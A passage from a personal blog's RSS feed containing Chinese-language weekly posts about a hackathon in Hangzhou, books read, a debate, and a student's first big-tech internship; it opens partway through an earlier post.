&lt;p&gt;白鸽在天空中展翅飞翔&lt;br&gt;
青春的花朵在心中开放&lt;br&gt;
年轻的朋友们团结起来&lt;br&gt;
为和平为友谊献出力量&lt;br&gt;
拉起手唱起歌跳起舞来&lt;br&gt;
让我们唱一支团结之歌&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;下周见。&lt;/p&gt;
</content:encoded><author>me@skywt.cn</author></item><item><title>Weekly #9：AdventureX —— 热爱为主，搞钱为辅</title><link>https://skywt.cn/blog/weekly-9/</link><guid isPermaLink="true">https://skywt.cn/blog/weekly-9/</guid><description>&gt; 总有人心里有火炬，而且彼此能看见。
&gt;
&gt; —— 麦卡锡《长路》

</description><pubDate>Sun, 21 Jul 2024 23:50:00 GMT</pubDate><content:encoded>&lt;blockquote&gt;
&lt;p&gt;总有人心里有火炬，而且彼此能看见。&lt;/p&gt;
&lt;p&gt;—— 麦卡锡《长路》&lt;/p&gt;
&lt;/blockquote&gt;
&lt;!--more--&gt;
&lt;p&gt;本周在杭州参加了 &lt;strong&gt;AdventureX&lt;/strong&gt;，这是第一个面向中国年轻人的黑客松。我觉得&lt;strong&gt;这是我参加过的最有意思、最有意义也最酷的活动&lt;/strong&gt;。不仅认识了很多新朋友，也了解到了很多新东西，甚至彻底改变了我的一些观念。&lt;/p&gt;
&lt;h2&gt;🌆 封面图：湖畔的日出&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2024/07/1839020241.jpg&quot; alt=&quot;封面图：湖畔的日出&quot;&gt;&lt;/p&gt;
&lt;p&gt;这次比赛的五天里，看了两次日出。&lt;/p&gt;
&lt;p&gt;第一次是周三早上。前一天晚上我们熬夜讨论（和聊天），甚至凌晨的时候离开会场去散步，不知不觉到了凌晨四点。骑车回酒店休息的时候，正好碰上了日出，看到了天一点一点亮起来。&lt;/p&gt;
&lt;p&gt;第二次是周五早上。这天上午 8:30 是项目提交 DDL，所以前一天晚上我们完全没有睡觉。四点半的时候，距离日出还有不到一小时，我们临时决定：打车去西湖看日出！&lt;/p&gt;
&lt;p&gt;人在半夜的时候总会有那种白天不会产生的、很疯狂的想法。😁&lt;/p&gt;
&lt;h2&gt;🔥 热爱为主，搞钱为辅&lt;/h2&gt;
&lt;p&gt;第一天展会的合作方 Spark Lab 准备了一个大展示牌，是个关于大家在做的项目的坐标轴，横轴是「热爱」，纵轴是「赚钱」。大家可以根据自己的 MBTI 选择一个颜色的贴纸，然后将贴纸贴在自己的项目对应的坐标轴位置。&lt;/p&gt;
&lt;p&gt;最后的结果让我印象深刻，是这样的：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2024/07/1696097582.jpg&quot; alt=&quot;热爱为主，搞钱为辅&quot;&gt;&lt;/p&gt;
&lt;p&gt;我觉得，一句话概括就是：&lt;strong&gt;热爱为主，搞钱为辅&lt;/strong&gt;。大家在做自己项目的时候，大多是以发自内心的热爱为主导。这样的热爱，在大学里很少见，在大厂里也很难见到。&lt;strong&gt;这很酷&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;我真的感受到了参加这次比赛的体验，和平常在大厂打工的体验，有多么不同。一个最直观的感受就是：在大厂干了一天活，到晚饭时间就非常累了，每天晚上回来都是什么都不想做的状态；早上起床，也经常是充满了怨气地来到工位。似乎每天都很累。而在这里，虽然中间三天都没怎么睡觉，却一点也不犯困，每天都很兴奋。或许这就是创造带来的兴奋感。&lt;/p&gt;
&lt;p&gt;归根结底，&lt;strong&gt;大厂必然是压制员工的创新的&lt;/strong&gt;。作为一个大型的多人协作组织，大厂需要的是对决策的服从，而非质疑。作为个人而言，在这一过程中自己的创新显然被压制了，从而难以获得价值感和意义感。真正能够展现自己创意的工作，或许只能在小团队中产生，比如这次黑客松。&lt;/p&gt;
&lt;h2&gt;🤝 我其实并不这么社恐&lt;/h2&gt;
&lt;p&gt;参加比赛之前，以为我会很社恐。甚至开幕式之前的那个中午，即将出发前往会场的时候，真的有一种强烈的恐惧感。&lt;/p&gt;
&lt;p&gt;然而到了会场，不管是第一天的开幕式、展会，还是之后的比赛、expo，&lt;strong&gt;我发现自己并没有这么社恐&lt;/strong&gt;。因为能够感觉到，大家都是普通人，大家也有和我一样面对陌生人的感觉（几个社牛除外）。但是想到大家心中都怀揣着一样的激情和热爱，相互了解也并不再是如此难的事情。&lt;/p&gt;
&lt;p&gt;特别是，和有意思的人认识和交流，反而是一件非常快乐的事情。我们对许多事情都深有同感，能够找到共鸣；我也能听到他们对许多事情的想法和看法，接触不一样的世界观，引发许多思考。这一过程真的非常神奇。&lt;/p&gt;
&lt;p&gt;现在我理解了《乔布斯传》里所说的乔布斯「喜欢和人一起散步」。我真正地感受到，&lt;strong&gt;观点会在碰撞中产生&lt;/strong&gt;。与他人的交流之中，不同思维的碰撞往往能产生各种各样的想法，这些想法是一个人平时想不到的。&lt;/p&gt;
&lt;h2&gt;🌟 时代中的青春力量&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2024/07/1395325749.jpg&quot; alt=&quot;所有的火，都是火&quot;&gt;&lt;/p&gt;
&lt;p&gt;高中的时候看到过这样一句话：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;总有人心里有火炬，而且彼此能看见。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;—— 麦卡锡《长路》&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;参加这次活动的时候，有感而发。&lt;strong&gt;我认为这次活动是对这句话最好的见证。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;之前 &lt;a href=&quot;https://skywt.cn/blog/weekly-4/&quot;&gt;Weekly #4 阅读与人生自我设计&lt;/a&gt;中提到，&lt;strong&gt;要认清时代的主潮&lt;/strong&gt;。我觉得当今时代最根本的主潮之一就是：&lt;strong&gt;经济下行&lt;/strong&gt;。由此，年轻人的内卷也好，躺平也好，迷茫焦虑也好，卷绩点、考研、考公考编风气的盛行也好，都是这一主潮的外在表征。&lt;/p&gt;
&lt;p&gt;而在这次比赛里我感受到的却是一种截然相反的风气：大家都充满激情和热爱，有着各种想法以及将它们变为现实的驱动力。将这样一群年轻人聚在一起，就将这种热情无限地聚集和放大，迸发出属于青年和青春的力量。这一切反而与时代的风气格格不入。&lt;strong&gt;这是对时代风气的反叛，也是对「嬉皮士精神」最好的诠释。&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;他们发明。&lt;/p&gt;
&lt;p&gt;他们想象。&lt;/p&gt;
&lt;p&gt;他们治愈。&lt;/p&gt;
&lt;p&gt;他们探索。&lt;/p&gt;
&lt;p&gt;他们创造。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;💬 最后要说的话&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2024/07/3023577575.jpg&quot; alt=&quot;开放中，可以来聊～&quot;&gt;&lt;/p&gt;
&lt;p&gt;非常感谢主办方和合作方。主办方是一群高中生。他们的种种努力，无论是陪我们熬的夜，对 LGBT 群体的尊重，还是超酷的伍德斯托克音乐节，都被我们看在眼里。正是他们独属于少年的理想主义，让这场活动更酷。&lt;/p&gt;
&lt;p&gt;我还要感谢队友 &lt;strong&gt;Kronight&lt;/strong&gt;、&lt;strong&gt;薇龙&lt;/strong&gt;和 &lt;strong&gt;Seimo&lt;/strong&gt;。或许是由于我们队早就确定了「友谊第一，比赛第二」的总方针，我们队内有特别融洽的氛围。也要感谢其他我遇见的伙伴们。我永远会记得和这群人凌晨三四点一起熬的夜、逛的马路、看的日出、吃的海底捞。&lt;/p&gt;
&lt;p&gt;或许如薇龙所说，这一切都是命中注定的缘分。✨&lt;/p&gt;
&lt;p&gt;明年希望能再见。&lt;/p&gt;
</content:encoded><author>me@skywt.cn</author></item><item><title>Weekly #8：知识分子应该是什么样子？</title><link>https://skywt.cn/blog/weekly-8/</link><guid isPermaLink="true">https://skywt.cn/blog/weekly-8/</guid><description>&gt; 哪见过我俩这样的爱人、恋人、情人啊？相识相爱将近五年了--千六百多个日日夜夜，居然连一次面也不曾见过！情人节之际，竟然连几朵鲜花、一束玫瑰也不能彼此馈赠，更别说想象之中和期盼已久的相拥相吻！其是令人感慨，悲哀！其没想到，交通和通信如此发达的今天，我们仍像古人般艰难地「红叶题诗」，「鱼传尺柰」；像牛郎织女般「盈盈一水间，脉脉不得语」——何况，牛郎织女每年「七夕」尚能「打鼓吹萧银汉过，并肩携手鹊桥游」啊！
&gt;
&gt; ——《第二次握手》

</description><pubDate>Wed, 10 Jul 2024 20:50:00 GMT</pubDate><content:encoded>&lt;blockquote&gt;
&lt;p&gt;哪见过我俩这样的爱人、恋人、情人啊？相识相爱将近五年了--千六百多个日日夜夜，居然连一次面也不曾见过！情人节之际，竟然连几朵鲜花、一束玫瑰也不能彼此馈赠，更别说想象之中和期盼已久的相拥相吻！其是令人感慨，悲哀！其没想到，交通和通信如此发达的今天，我们仍像古人般艰难地「红叶题诗」，「鱼传尺柰」；像牛郎织女般「盈盈一水间，脉脉不得语」——何况，牛郎织女每年「七夕」尚能「打鼓吹萧银汉过，并肩携手鹊桥游」啊！&lt;/p&gt;
&lt;p&gt;——《第二次握手》&lt;/p&gt;
&lt;/blockquote&gt;
&lt;!--more--&gt;
&lt;p&gt;又是一周！&lt;/p&gt;
&lt;p&gt;已经很难记录一周的事情了。感觉现在这个 Weekly 存在的意义，更多是锻炼自己的写作和表达能力。毕竟平时写作的机会也很少。&lt;/p&gt;
&lt;h2&gt;🌆 封面图：城市里的夕阳&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2024/07/3201920425.jpg&quot; alt=&quot;封面图：城市里的夕阳&quot;&gt;&lt;/p&gt;
&lt;h2&gt;📚 《第二次握手》：知识分子应该是什么样子？&lt;/h2&gt;
&lt;p&gt;《第二次握手》是一部传奇的长篇小说，在文革时期曾经以手抄本的形式流行全国，曾被官方认定为禁书，作者也差点引来杀身之祸，直到文革结束。本周在读这本书，非常喜欢！&lt;/p&gt;
&lt;p&gt;这本书展现的&lt;strong&gt;知识分子&lt;/strong&gt;的生活，令我深深地震撼。19 岁的男主苏冠兰，在齐鲁大学学习化学，坐在火车上的他居然在读德文原版的《拓扑学概论》！&lt;/p&gt;
&lt;p&gt;从字里行间也能看出作者的知识面之广。这本书涉及到大量物理、化学、生物学、艺术、历史、文学的知识，夹杂在小说情节中。比如，说到男主苏冠兰的名字，作者介绍起各种叫“兰”的植物在植物学上的科属分类；描写男主的心境，则通过名画《无名女郎》和《第九个浪头》侧面表现；女主对爱情的渴望，则凝聚在独舞《婚礼》和各种古典乐；对曼哈顿工程的描述也十分具体，居然以科普的态度给我们介绍了原子弹的各种原理……&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;「琼姐，」只有苏冠兰不以为然，蹙起眉头，「你如此聪明，为什么要学艺术，学舞蹈呢？」&lt;/p&gt;
&lt;p&gt;丁洁琼表情惶惑，不吱声。&lt;/p&gt;
&lt;p&gt;「什么意思？」凌云竹打量苏冠兰。&lt;/p&gt;
&lt;p&gt;「文学，艺术，以及诸如此类的东西，」苏冠兰倒是干脆利落，「对国家的强盛和民族的复兴，没有作用。」&lt;/p&gt;
&lt;p&gt;「什么才对国家的强盛和民族的复兴有作用？」&lt;/p&gt;
&lt;p&gt;「科学、技术和工业。」&lt;/p&gt;
&lt;p&gt;凌云竹凝视苏冠兰。&lt;/p&gt;
&lt;p&gt;「文学艺术是什么？」苏冠兰口气不屑，「『朱门沉沉按歌舞，厩马肥死弓断弦』，『商女不知亡国恨，隔江犹唱后庭花』，『借问汉宫谁得似？可怜飞燕倚新妆』，『忍把浮名，换了浅斟低唱』……」&lt;/p&gt;
&lt;p&gt;「你知道《满江红》吗？」凌云竹摆摆手。&lt;/p&gt;
&lt;p&gt;「知道呀……」&lt;/p&gt;
&lt;p&gt;「那你就应该懂得，世间固然有『浅斟低唱』，但也有『壮怀激烈』；固然有人不知忘国恨，但也有人『驾长车踏破破贺兰山缺』！」&lt;/p&gt;
&lt;p&gt;苏冠兰一时无言以对。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;在如今这个信息发达的时代，如果要查询这么复杂的资料尚且不容易，更无法想象作者是在那样的年代成书的！&lt;/p&gt;
&lt;p&gt;书中展现的是那个时代的&lt;strong&gt;知识分子群像&lt;/strong&gt;。他们不仅满怀爱国之情，也怀揣着对知识殿堂的敬仰，对爱情的忠贞不渝，对艺术、生活一切领域的热情和热爱。&lt;/p&gt;
&lt;p&gt;反观现代，「知识分子」作为一个政治术语逐渐被减少使用，而真正的「知识分子」也越来越少了。经济社会的发展带来的专业分工是必然，而大多数人则顺应了这样的专业分工。&lt;/p&gt;
&lt;p&gt;我觉得「知识分子」应该是能读更多书，探索更广阔的世界。毕竟，「&lt;strong&gt;君子不器&lt;/strong&gt;」。&lt;/p&gt;
&lt;h2&gt;📚 本周重读：《人类群星闪耀时》&lt;/h2&gt;
&lt;p&gt;自我介绍的时候想着安利两本书，翻了翻读过的书的列表，选出了我特别喜欢的两本书：《献给阿尔吉侬的花束》和这本《人类群星闪耀时》。顺便重新读了一下这本书。&lt;/p&gt;
&lt;p&gt;《人类群星闪耀时》是「十四篇历史特写」，是一些人类历史上的重要关头，从中真的能够感觉到人类文明的伟大光辉。读的时候往往有一种「颅内高潮」的感觉！&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;没有哪位艺术家能全天二十四小时创作艺术。那些显赫不朽的艺术杰作往往诞生于艺术家们灵感乍现的难得瞬间。历史亦是如此。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我最喜欢的两篇，一篇是《越洋的第一句话》，一篇是《西塞罗》。&lt;/p&gt;
&lt;p&gt;《越洋的第一句话》讲述的是赛勒斯·韦斯特·菲尔德第一次尝试将电缆跨过大西洋，将整个人类连接在一起的故事。他经历了三次失败，最终完成了这一伟大的事业。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;要想成就一个奇迹或一项伟业，一个重要的前提条件永远不可或缺：对这一奇迹深信不疑的人。执着者的天真和勇气，往往能富有创造性地促进学者们迟迟不决的计划。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;这一刻，他决定倾尽一切身家献身于这项事业中。决定性的火焰就此点燃。一个念头在事实上爆发出爆炸性的力量。一种全新的、奇迹般的电力和强烈而活跃的生命元素——人的意志，紧紧地结合在一起。一个人获得了毕生的使命，而这一使命，也找到了去实现它的人。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;从这一刻起，整个地球跳动着同一颗心脏。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;《西塞罗》讲述的是罗马伟大的思想家西塞罗，梦想在自己的国家建立民主的制度，然而在自己生命的晚期，遭遇了罗马政变，统治者深感他的思想中蕴含的危险力量，将其残忍杀害。&lt;/p&gt;
&lt;p&gt;在这篇的末尾，统治者雇佣的杀手杀害了西塞罗后，将他的头颅砍下，挂在他平日的演讲台上。于是：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;然而，在这个演讲台上，任何反对残暴、反对强权、反对践踏法律的演说家的控诉，都比不上这颗沉默的被谋杀者的头颅，对永远不义的暴力的控诉更为意义深远：惊恐的民众拥堵在被亵渎的讲台周围，沮丧、羞愧，瑟缩到一侧。没有人敢于驳斥——&lt;strong&gt;这就是独裁！&lt;/strong&gt;然而他们的心却在压抑地抽搐，在被钉在十字架上的共和国的这一悲惨画面前，战栗地垂下眼帘。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;🤔 如果你有超能力，可以让你爱的人也爱你，你要不要使用这项超能力？&lt;/h2&gt;
&lt;p&gt;这是本周看的一场辩论赛：&lt;a href=&quot;https://www.bilibili.com/video/BV1W7411B74e/?share_source=copy_web&amp;amp;vd_source=cd3fa74d3421ce574a62e3c11dcde9f6&quot;&gt;2019 年华语辩坛老友赛第二场 —— 如果你有超能力，可以让你爱的人也爱你，你要不要使用这项超能力？【RUC-Bang VS 萌新下山】&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;一直觉得作为观众，看辩论赛重要的不是观点，而是双方的讨论引发我们的思考。&lt;/p&gt;
&lt;p&gt;本场选手提出了一个「爱上」的定义，很有意思。正方认为是&lt;strong&gt;近似随机的参数组合&lt;/strong&gt;使人产生爱情这种感觉，对某个人怦然心动。这是人无法自主选择的。或许面对一个非常优秀的 TA，我却无论如何都没有感觉；或许对于偶然闯入生活的 TA，虽然不符合之前对于理想型的所有预设，我却无可救药地爱上了。或许之前和 TA 作为普通朋友交往多年，某一天阳光正好，TA 的微笑让我怦然心动。一切的一切都有太多的随机因素。这种随机性，一般称为&lt;strong&gt;缘分&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;在东方和西方的传说中，爱情由糊涂的月下老人和调皮的爱神丘比特决定。正是由于「爱上」这一过程的随机性，传说中塑造的人物形象总是近乎随机作出决策。爱上的感觉不是人的主观意识决定的，而是随机发生的（可以等效为第三方随机决定的），所以说：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;爱是自由意志的沉沦。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;反方也提出了一些比较有意思的观点，比如爱的珍贵和美好正是源于&lt;strong&gt;稀缺性&lt;/strong&gt;，求之不得，才会寤寐思服。&lt;/p&gt;
&lt;p&gt;不过整体看下来，我对这场辩论赛的&lt;strong&gt;观赏性&lt;/strong&gt;是有些失望的。感觉这也是近年的辩论赛普遍的样子：双方选手都拼命地在争定义，着重于逻辑，而对「语言的艺术」不那么重视了。作为观众需要使劲 follow 双方的逻辑，能 follow 上就不错了，很少能产生「拍案叫绝」的感觉。&lt;/p&gt;
&lt;p&gt;我心目中体现语言艺术的辩论，最经典的就是这场：&lt;a href=&quot;https://www.bilibili.com/video/BV19x411w76e/?share_source=copy_web&amp;amp;vd_source=cd3fa74d3421ce574a62e3c11dcde9f6&quot;&gt;【辩论】辩论史上最经典的战役——2001国际大专辩论赛决赛  钱是/不是万恶之源&lt;/a&gt;。这场简直百看不厌，特别是自由辩环节，非常精彩。没有复杂难懂的逻辑，只有纯粹的唇枪舌战。其实从逻辑上来说，双方只要争「万恶之源」中「万」一字的定义就好了，然而这样就会很没意思。双方对决的时候不仅争了逻辑，对对方的所有例子都能给出反驳，一些对战真是令人拍案叫绝，极具观赏性。&lt;/p&gt;
&lt;h2&gt;🧑‍💻 大厂实习初体验（二）&lt;/h2&gt;
&lt;p&gt;在公司里工作，和自己创造产品，感觉是完全不一样的。&lt;/p&gt;
&lt;p&gt;在大厂实习并没有我想象的快乐。以前写代码的时候，觉得创造的过程是很快乐的，技术的结构是很美的，但是在大厂却完全没有这样的感受。每天只是做一个又一个的需求。对于写的代码，我并没有「在创造自己的东西」的感觉，因为产品本来就不是我的。只是这些代码被拿去换成了工资。&lt;/p&gt;
&lt;p&gt;在每天的忙碌中，很难找到意义感。&lt;/p&gt;
&lt;p&gt;退一万步说，即使有大厂的股票，我也不会觉得大厂或者其产品有我的一部分。因为没有&lt;strong&gt;决策权&lt;/strong&gt;。大厂里就是有太多不合理的东西，我们无力改变。&lt;/p&gt;
&lt;p&gt;下周见。&lt;/p&gt;
</content:encoded><author>me@skywt.cn</author></item><item><title>Weekly #7：大厂实习初体验</title><link>https://skywt.cn/blog/weekly-7/</link><guid isPermaLink="true">https://skywt.cn/blog/weekly-7/</guid><description>&gt; 医药、法律、商业、工程，都是高贵的理想和维生的条件。但是，诗、美、浪漫、爱，才是我们生存的原因。
&gt;
&gt; ——《死亡诗社》

</description><pubDate>Tue, 02 Jul 2024 20:00:00 GMT</pubDate><content:encoded>&lt;blockquote&gt;
&lt;p&gt;医药、法律、商业、工程，都是高贵的理想和维生的条件。但是，诗、美、浪漫、爱，才是我们生存的原因。&lt;/p&gt;
&lt;p&gt;——《死亡诗社》&lt;/p&gt;
&lt;/blockquote&gt;
&lt;!--more--&gt;
&lt;h2&gt;🌆 封面图：杭州！&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2024/06/324660359.jpg&quot; alt=&quot;我 ❤️ 杭州&quot;&gt;&lt;/p&gt;
&lt;h2&gt;🧑‍💻 大厂实习初体验&lt;/h2&gt;
&lt;p&gt;本周是在某大厂实习的第一周。这也是我的第一份实习。&lt;/p&gt;
&lt;p&gt;实习地点是该厂位于杭州的全球总部，今年新开放的园区，硬件条件真的很不错。整体的建筑设计，包括空间、灯光、窗户之类的各种设计，都给人很舒服的感觉。园区内有大量绿化，除了篮球场、健身房等设施以外，甚至还有个田径场。这个园区希望营造的「&lt;strong&gt;校园感&lt;/strong&gt;」，从硬件设施上来说确实达到了。其中的办公楼，就很像某些大学设计独特的图书馆。&lt;/p&gt;
&lt;p&gt;第一次在真正的大厂里工作，接触到了很多我之前不知道的东西。比如，工作的网络环境完全在企业内网中，不管是代码平台还是各种项目管理、行政、文档平台，一切都部署在内网中，不仅 npm 仓库有镜像，甚至 npm 工具本身都有集团专属的 fork 版本。GPT4o 等工具也有集团内网提供的平台可以免费使用。虽然可以申请合法的国际信道，但是我发现工作中几乎用不到境外网路访问，除了偶尔用一下 Google。我们要使用的许多开源库，也有集团内的 fork 版放在内网代码平台。&lt;strong&gt;在这里，就像在一个密闭的空间里工作，很少用到外部互联网的资源。&lt;/strong&gt;（在以前，写任何前端项目的时候，离开 GitHub 和 Stack Overflow 都是无法想象的……）&lt;/p&gt;
&lt;p&gt;该厂的 MacBook 普及率高到了我以前无法想象的地步。入职前申请设备的时候我猜想，以 MacBook 的市场占有率来看，选择 MacBook 的人数占比应该不会超过一半，大多数应该还是选择 Windows PC 吧……结果第一次开会的时候，看见&lt;strong&gt;所有人使用的都是 MacBook&lt;/strong&gt;，没有一台其他品牌的笔记本。这着实震惊了我……（我也领到了全新的 M3 Pro 的 MacBook Pro，嘿嘿）&lt;/p&gt;
&lt;p&gt;工作，和我之前想象的一样，确实有些累。每天坐在电脑前，高度专注，到了晚饭时间都非常累了，真不知道同事们是怎么如此有精力加班的。一下子从上学期末每天自由快乐学习阅读的生活，转变到现在这样的生活，一时有些过渡不过来。或许还是需要缓慢地去适应。&lt;/p&gt;
&lt;p&gt;在步入社会之前，我们所处的所有组织机构，从幼儿园到小学、中学、大学，&lt;strong&gt;存在的目的都是为了我们&lt;/strong&gt;，学校都是为了「培养学生」这一目的而存在的。而公司企业，则是我们第一个真正接触的，&lt;strong&gt;目的不是为了我们&lt;/strong&gt;的地方：客户和经济效益才是它们的目的。想起来高中班主任有一次说道：「你们现在在上学，生病了还有人嘘寒问暖，我们上班的生病缺勤一次，全勤奖就没啦！」确实，离开了学校，没有任何社会机构为我们存在、为我们负责了。虽然还未遭遇真正的危机和挫折，但是离开象牙塔的这种感觉已经让我有所感触。&lt;/p&gt;
&lt;p&gt;在一个新环境里，也忍不住幻想自己的未来。还是很喜欢该厂招聘网页的那句 slogan：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;一起打开有意思的未来！&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;我不是来混一口饭吃的&lt;/strong&gt;。我真的很希望做一些有意思的事情，遇到有意思的人，开启有意思的未来。希望有这样的地方，能满足我的愿望。&lt;/p&gt;
&lt;h2&gt;🏙️ 去（回）杭州随想&lt;/h2&gt;
&lt;p&gt;杭州是我的「&lt;strong&gt;第二故乡&lt;/strong&gt;」。高中的我在这里度过了三年多的时光。我觉得这次我来到杭州，用上期标题里的「去（回）杭州」来描述很贴切。既是回到曾经的城市，也是奔赴新的生活。&lt;/p&gt;
&lt;p&gt;上期提到了，回到杭州，我惊讶于&lt;strong&gt;杭州居然新开通了这么多条地铁线路&lt;/strong&gt;。三年前，还没有杭州西站，还没有 19 号线，每次开学从杭州东站到达杭州，都要坐公交车去学校。现在，19 号线连通杭州东站、杭州西站、萧山国际机场，还经过我们中学附近的文三路站，可以在沈塘桥站换乘 2 号线。而沈塘桥站的商业街也不见了，变成了一个很大、很空旷的换乘站。&lt;/p&gt;
&lt;p&gt;周末回到文三路，去逛了曾经生活过的地方。许多地方还在，许多地方不见了。全家 FamilyMart 不开了，打印店变成了社区服务中心，酒店变成了写字楼……三年时光如弹指一挥间，令人感慨。&lt;/p&gt;
&lt;p&gt;这次回杭州，还有一个直观的感受：（和长沙相比）&lt;strong&gt;杭州的物价真高！&lt;/strong&gt;周末在屋子里点外卖，发现一餐居然基本都要三十多元，和肯德基麦当劳的日常价差不多了。大多数的商家处于这样一种情况：价格正好处于让我心痛的价格。如果价格更低一点，我下单的时候就不会心痛了；如果价格更高一点，我就不会想吃，不会下单也不会心痛了；而它们正处于这个尴尬的价格：既没有高到让我不想吃，又没有低到让我不犹豫。所以，在杭州点外卖，总是很心痛的。😭&lt;/p&gt;
&lt;p&gt;虽然都说杭州是「美食荒漠」，但是我其实特别喜欢杭州的几家连锁餐饮品牌：外婆家、绿茶、炉鱼、新白鹿、老娘舅等等。但是，它们的价格似乎都处于上述的「心痛价」……&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;实习一周的感受：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;上班好累 😭 感觉身体被掏空&lt;/li&gt;
&lt;li&gt;杭州物价好高 😭 感觉钱包被掏空&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;p&gt;网友锐评精选：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;杭州赚钱杭州花，一分别想带回家。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;以及科普一个新发现的冷知识：&lt;strong&gt;「杭州学军中学」这个名字究竟是哪里来的？&lt;/strong&gt;高中的时候就一直很好奇。现在查了 Wikipedia 才知道，文革期间的 1966 年 5 月 7 日，毛泽东发出《&lt;a href=&quot;https://zh.wikipedia.org/wiki/五七指示&quot;&gt;五七指示&lt;/a&gt;》，其中提到：「军队应该是一个大学校……这个大学校，学政治，学军事，学文化……学生也是这样，以学为主，兼学别样，即不但学文，也要&lt;strong&gt;学工、学农、学军&lt;/strong&gt;，也要批判资产阶级。学制要缩短，教育要革命……」为了响应这个指示，杭州现在的文一路、文二路、文三路，当时分别改名为「学工路」、「学农路」、「学军路」。处于学军路（文三路）的当时的杭州大学附属中学，即更名为&lt;strong&gt;杭州学军中学&lt;/strong&gt;。改革开放后，文一路、文二路、文三路的路名改了回来，而学军中学的校名却延续至今。&lt;/p&gt;
&lt;h2&gt;🛠️ 关于高考「技术」这门学科&lt;/h2&gt;
&lt;p&gt;众所不周知，浙江的新高考，除了语文、数学、英语、物理、化学、生物、政治、历史、地理这九门传统的学科以外，还有一门浙江独有的学科，叫做「&lt;strong&gt;技术&lt;/strong&gt;」。选考是七选三，我当年选的就是物理、化学、技术。&lt;/p&gt;
&lt;p&gt;这门学科其实分为&lt;strong&gt;通用技术&lt;/strong&gt;（General Technology，GT）和&lt;strong&gt;信息技术&lt;/strong&gt;（Information Technology，IT）两门，每一门各占 50 分，合计 100 分。&lt;/p&gt;
&lt;p&gt;我们当时信息技术的考点包括：Word 字处理、Excel 表处理、Access 数据库、Flash 动画制作，GoldWave 音频处理，以及 Visual Basic 编程（我们下一届改为了 Python）和一些简单的算法与数据结构。&lt;/p&gt;
&lt;p&gt;通用技术的考点包括：金属、木材加工工艺、焊接、画草图和三视图、控制论常识等。&lt;/p&gt;
&lt;p&gt;在高中学习这些，可以说是遥遥领先了。进入大学发现许多东西在高中「技术」课上都学过了，比如小学期实训的焊接、数据库课程的各种概念。如果学的是机械或者土木一类的专业，通用技术学的金工木工和草图、三视图一定也能派上用场。&lt;/p&gt;
&lt;p&gt;仔细想想，高中学的其他所有学科，基本都是「&lt;strong&gt;科学&lt;/strong&gt;」。数学、物理、化学、生物、地理这类&lt;strong&gt;自然科学&lt;/strong&gt;不必说，即使政治、历史这两门也是&lt;strong&gt;社会科学&lt;/strong&gt;（只是高考基本靠背诵，没有体现什么科学方法）。所谓科学，就是探究这个世界的运行原理。&lt;/p&gt;
&lt;p&gt;「科学技术」两个概念，这些学科都只涉及前者。为什么很少涉及技术呢？我认为一个很重要的原因是：技术更新迭代的速度太快。例如信息技术这门学科：关于 Flash 的这些教材才刚刚普及开没几年，就被彻底淘汰了……&lt;/p&gt;
&lt;p&gt;之所以「技术」尤其是信息技术这门课只特供于浙江省，我觉得或许和「共同富裕示范区」有关。以前我们一直自嘲衢州是「浙江的西藏」，是全省经济最弱后的地方；然而，从小到大，即使在外婆家的乡下，我也没见到特别贫困的生活。反而经济的高速发展给我们家带来了机会。然而，上了大学，将眼界放大至全国，我才真正认识到原来居然中国居然有这么穷的地方，人们连用上电脑都很困难，更别提将信息技术纳入高考了。所以，生在浙江，我真的很幸运。&lt;/p&gt;
&lt;h2&gt;📝 希望把 Weekly 坚持下去！&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;我不希望生活只是无意识流过的时间。&lt;/strong&gt;我希望自己每天的生活在时间里留下印记。这是思考为什么要写 Weekly 的时候，我现在脑海里蹦出的第一个想法。&lt;/p&gt;
&lt;p&gt;各种新奇的想法和思考，都是在闲暇生活中产生的。一个过于忙碌的人，每天被按部就班的事项排满，是很难迸发灵感、发挥创造力的。我不希望自己过上每天「感觉身体被掏空」的生活，除了工作就是视频娱乐的生活，一个月只有发薪日感觉快乐的生活。我不希望被「卷入」工作。我也希望追求生活里其他值得追求的东西。&lt;/p&gt;
&lt;p&gt;每周写的 Weekly 可以作为见证。&lt;/p&gt;
